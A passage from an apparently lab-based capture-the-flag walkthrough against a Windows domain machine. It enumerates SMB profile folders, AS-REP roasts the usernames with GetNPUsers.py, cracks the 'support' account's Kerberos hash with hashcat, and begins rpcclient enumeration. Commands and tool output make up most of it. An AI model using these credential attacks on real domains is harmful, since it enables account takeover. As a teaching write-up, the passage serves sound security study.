  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3579546 blocks available
smb: \&gt; 
</span></code></pre></div></div>
<h2 id="making-a-username-list-from-the-profiles">making a <code class="language-plaintext highlighter-rouge">username</code> list from the <code class="language-plaintext highlighter-rouge">profiles</code></h2>

<blockquote>
  <p>Copy the usernames to a file <code class="language-plaintext highlighter-rouge">users.txt</code> and scan for <code class="language-plaintext highlighter-rouge">Kerberos tickets</code>.</p>
</blockquote>

<h2 id="getting-kerberos-ticket">Getting Kerberos ticket</h2>

<h2 id="using-impacket-getnpuserspy-to-get-the-kerberos-ticket">Using impacket <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> to get the kerberos ticket.</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span>  <span class="n">blackfield</span><span class="p">.</span><span class="n">local</span><span class="o">/</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">blackfield</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
</code></pre></div></div>

<h3 id="after-running-impacket-script-we-get-the-kerberos-ticket-of-support">After running impacket script we get the kerberos ticket of <code class="language-plaintext highlighter-rouge">support</code>.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">User</span> <span class="n">svc_backup</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span>

</code></pre></div></div>

<h2 id="time-to-crack-the-hash">Time to crack the hash.</h2>

<h3 id="we-can-user-any-hash-cracker-of-our-choice-here-ive-used-hashcat-to-crack-the-hash">we can user any hash cracker of our choice, here I’ve used <code class="language-plaintext highlighter-rouge">hashcat</code> to crack the hash.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hashcat</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">m</span> <span class="mi">18200</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="nf">hashcat </span><span class="p">(</span><span class="n">v6</span><span class="p">.</span><span class="mf">0.0</span><span class="p">)</span> <span class="n">starting</span><span class="bp">...</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Unstable OpenCL driver detected!
</span>
<span class="n">This</span> <span class="n">OpenCL</span> <span class="n">driver</span> <span class="n">has</span> <span class="n">been</span> <span class="n">marked</span> <span class="k">as</span> <span class="n">likely</span> <span class="n">to</span> <span class="n">fail</span> <span class="n">kernel</span> <span class="n">compilation</span> <span class="ow">or</span> <span class="n">to</span> <span class="n">produce</span> <span class="n">false</span> <span class="n">negatives</span><span class="p">.</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">use</span> <span class="o">--</span><span class="n">force</span> <span class="n">to</span> <span class="n">override</span> <span class="n">this</span><span class="p">,</span> <span class="n">but</span> <span class="n">do</span> <span class="ow">not</span> <span class="n">report</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: CUDA SDK Toolkit installation NOT detected.
</span>             <span class="n">CUDA</span> <span class="n">SDK</span> <span class="n">Toolkit</span> <span class="n">installation</span> <span class="n">required</span> <span class="k">for</span> <span class="n">proper</span> <span class="n">device</span> <span class="n">support</span> <span class="ow">and</span> <span class="n">utilization</span>
             <span class="n">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="n">OpenCL</span> <span class="n">Runtime</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: WARNING! Kernel exec timeout is not disabled.
</span>             <span class="n">This</span> <span class="n">may</span> <span class="n">cause</span> <span class="sh">"</span><span class="s">CL_OUT_OF_RESOURCES</span><span class="sh">"</span> <span class="ow">or</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>
             <span class="n">To</span> <span class="n">disable</span> <span class="n">the</span> <span class="n">timeout</span><span class="p">,</span> <span class="n">see</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">q</span><span class="o">/</span><span class="n">timeoutpatch</span>
<span class="nf">nvmlDeviceGetFanSpeed</span><span class="p">():</span> <span class="n">Not</span> <span class="n">Supported</span>

<span class="n">OpenCL</span> <span class="nc">API </span><span class="p">(</span><span class="n">OpenCL</span> <span class="mf">2.1</span> <span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#1 [Intel(R) Corporation]
</span><span class="o">=============================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Intel(R) HD Graphics 530, skipped
</span><span class="o">*</span> <span class="n">Device</span> <span class="c1">#2: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped
</span>
<span class="n">OpenCL</span> <span class="nc">API </span><span class="p">(</span><span class="n">OpenCL</span> <span class="mf">1.2</span> <span class="n">CUDA</span> <span class="mf">9.1</span><span class="p">.</span><span class="mi">112</span><span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#2 [NVIDIA Corporation]
</span><span class="o">=======================================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: GeForce GTX 950M, 3392/4096 MB (1024 MB allocatable), 5MCU
</span>
<span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Maximum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">256</span>

<span class="n">Hashes</span><span class="p">:</span> <span class="mi">1</span> <span class="n">digests</span><span class="p">;</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">digests</span><span class="p">,</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">salts</span>
<span class="n">Bitmaps</span><span class="p">:</span> <span class="mi">16</span> <span class="n">bits</span><span class="p">,</span> <span class="mi">65536</span> <span class="n">entries</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="n">mask</span><span class="p">,</span> <span class="mi">262144</span> <span class="nb">bytes</span><span class="p">,</span> <span class="mi">5</span><span class="o">/</span><span class="mi">13</span> <span class="n">rotates</span>
<span class="n">Rules</span><span class="p">:</span> <span class="mi">1</span>

<span class="n">Applicable</span> <span class="n">optimizers</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Zero</span><span class="o">-</span><span class="n">Byte</span>
<span class="o">*</span> <span class="n">Not</span><span class="o">-</span><span class="n">Iterated</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Hash</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Salt</span>

<span class="n">ATTENTION</span><span class="err">!</span> <span class="nc">Pure </span><span class="p">(</span><span class="n">unoptimized</span><span class="p">)</span> <span class="n">backend</span> <span class="n">kernels</span> <span class="n">selected</span><span class="p">.</span>
<span class="n">Using</span> <span class="n">pure</span> <span class="n">kernels</span> <span class="n">enables</span> <span class="n">cracking</span> <span class="n">longer</span> <span class="n">passwords</span> <span class="n">but</span> <span class="k">for</span> <span class="n">the</span> <span class="n">price</span> <span class="n">of</span> <span class="n">drastically</span> <span class="n">reduced</span> <span class="n">performance</span><span class="p">.</span>
<span class="n">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">switch</span> <span class="n">to</span> <span class="n">optimized</span> <span class="n">backend</span> <span class="n">kernels</span><span class="p">,</span> <span class="n">append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">your</span> <span class="n">commandline</span><span class="p">.</span>
<span class="n">See</span> <span class="n">the</span> <span class="n">above</span> <span class="n">message</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">about</span> <span class="n">the</span> <span class="n">exact</span> <span class="n">limits</span><span class="p">.</span>

<span class="n">Watchdog</span><span class="p">:</span> <span class="n">Temperature</span> <span class="n">abort</span> <span class="n">trigger</span> <span class="nb">set</span> <span class="n">to</span> <span class="mi">90</span><span class="n">c</span>

<span class="n">Host</span> <span class="n">memory</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">attack</span><span class="p">:</span> <span class="mi">151</span> <span class="n">MB</span>

<span class="n">Dictionary</span> <span class="n">cache</span> <span class="n">built</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Filename</span><span class="p">..:</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="o">*</span> <span class="n">Passwords</span><span class="p">.:</span> <span class="mi">14344394</span>
<span class="o">*</span> <span class="n">Bytes</span><span class="p">.....:</span> <span class="mi">139921528</span>
<span class="o">*</span> <span class="n">Keyspace</span><span class="p">..:</span> <span class="mi">14344387</span>
<span class="o">*</span> <span class="n">Runtime</span><span class="p">...:</span> <span class="mi">2</span> <span class="n">secs</span>

<span class="n">Cracking</span> <span class="n">performance</span> <span class="n">lower</span> <span class="n">than</span> <span class="n">expected</span><span class="err">?</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">lowers</span> <span class="n">the</span> <span class="n">maximum</span> <span class="n">supported</span> <span class="n">password</span><span class="o">-</span> <span class="ow">and</span> <span class="n">salt</span><span class="o">-</span><span class="nf">length </span><span class="p">(</span><span class="n">typically</span> <span class="n">down</span> <span class="n">to</span> <span class="mi">32</span><span class="p">).</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">w</span> <span class="mi">3</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">can</span> <span class="n">cause</span> <span class="n">your</span> <span class="n">screen</span> <span class="n">to</span> <span class="n">lag</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Update</span> <span class="n">your</span> <span class="n">backend</span> <span class="n">API</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">driver</span> <span class="n">the</span> <span class="n">right</span> <span class="n">way</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">wrongdriver</span>

<span class="o">*</span> <span class="n">Create</span> <span class="n">more</span> <span class="n">work</span> <span class="n">items</span> <span class="n">to</span> <span class="n">make</span> <span class="n">use</span> <span class="n">of</span> <span class="n">your</span> <span class="n">parallelization</span> <span class="n">power</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">morework</span>

<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="nd">@BLACKFIELD.LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="err">$</span><span class="mi">49841</span><span class="n">d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight
</span>
<span class="n">Session</span><span class="p">..........:</span> <span class="n">hashcat</span>
<span class="n">Status</span><span class="p">...........:</span> <span class="n">Cracked</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Name</span><span class="p">........:</span> <span class="n">Kerberos</span> <span class="mi">5</span><span class="p">,</span> <span class="n">etype</span> <span class="mi">23</span><span class="p">,</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Target</span><span class="p">......:</span> <span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="nd">@BLACKFIELD.LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f</span><span class="p">...</span><span class="mi">6</span><span class="n">ab74d</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Started</span><span class="p">.....:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">49</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">7</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Estimated</span><span class="p">...:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">56</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">0</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Base</span><span class="p">.......:</span> <span class="nc">File </span><span class="p">(</span><span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Queue</span><span class="p">......:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Speed</span><span class="p">.</span><span class="c1">#3.........:  2173.1 kH/s (7.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1
</span><span class="n">Recovered</span><span class="p">........:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span>
<span class="n">Progress</span><span class="p">.........:</span> <span class="mi">14336000</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.94</span><span class="o">%</span><span class="p">)</span>
<span class="n">Rejected</span><span class="p">.........:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">14336000</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Point</span><span class="p">....:</span> <span class="mi">14295040</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.66</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Sub</span><span class="p">.</span><span class="c1">#3...: Salt:0 Amplifier:0-1 Iteration:0-1
</span><span class="n">Candidates</span><span class="p">.</span><span class="c1">#3....: *toille*1410* -&gt; #!kayla
</span><span class="n">Hardware</span><span class="p">.</span><span class="n">Mon</span><span class="p">.</span><span class="c1">#3..: Temp: 54c Util: 47% Core: 928MHz Mem:2505MHz Bus:16
</span>
<span class="n">Started</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
<span class="n">Stopped</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">57</span> <span class="mi">2020</span>
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight</span>

</code></pre></div></div>
<p>So the password of <code class="language-plaintext highlighter-rouge">support</code> is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code></p>

<h3 id="as-i-got-the-password-of-support-i-tried-to-login-in-via-evil-winrm-but-no-luck-then-i-decided-to-use-rpcclient-to-enumerate-further">As I got the password of <code class="language-plaintext highlighter-rouge">support</code> I tried to login in via <code class="language-plaintext highlighter-rouge">evil-winrm</code> but no luck. Then I decided to use <code class="language-plaintext highlighter-rouge">rpcclient</code> to enumerate further.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient blackfield.htb -U support 
Enter WORKGROUP\support's password: 
rpcclient $&gt; 
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rpcclient</span> <span class="vg">$&gt;</span> <span class="n">enumprivs</span>
<span class="n">found</span> <span class="mi">35</span> <span class="n">privileges</span>

<span class="no">SeCreateTokenPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">2</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x2</span><span class="p">)</span>
<span class="no">SeAssignPrimaryTokenPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">3</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x3</span><span class="p">)</span>
<span class="no">SeLockMemoryPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">4</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x4</span><span class="p">)</span>
<span class="no">SeIncreaseQuotaPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">5</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x5</span><span class="p">)</span>
<span class="no">SeMachineAccountPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">6</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x6</span><span class="p">)</span>
<span class="no">SeTcbPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">7</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x7</span><span class="p">)</span>
<span class="no">SeSecurityPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">8</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x8</span><span class="p">)</span>
<span class="no">SeTakeOwnershipPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">9</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x9</span><span class="p">)</span>
<span class="no">SeLoadDriverPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">10</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xa</span><span class="p">)</span>
<span class="no">SeSystemProfilePrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xb</span><span class="p">)</span>
<span class="no">SeSystemtimePrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">12</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xc</span><span class="p">)</span>
<span class="no">SeProfileSingleProcessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">13</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xd</span><span class="p">)</span>
<span class="no">SeIncreaseBasePriorityPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xe</span><span class="p">)</span>
<span class="no">SeCreatePagefilePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">15</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xf</span><span class="p">)</span>
<span class="no">SeCreatePermanentPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x10</span><span class="p">)</span>
<span class="no">SeBackupPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">17</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x11</span><span class="p">)</span>
<span class="no">SeRestorePrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">18</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x12</span><span class="p">)</span>
<span class="no">SeShutdownPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">19</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x13</span><span class="p">)</span>
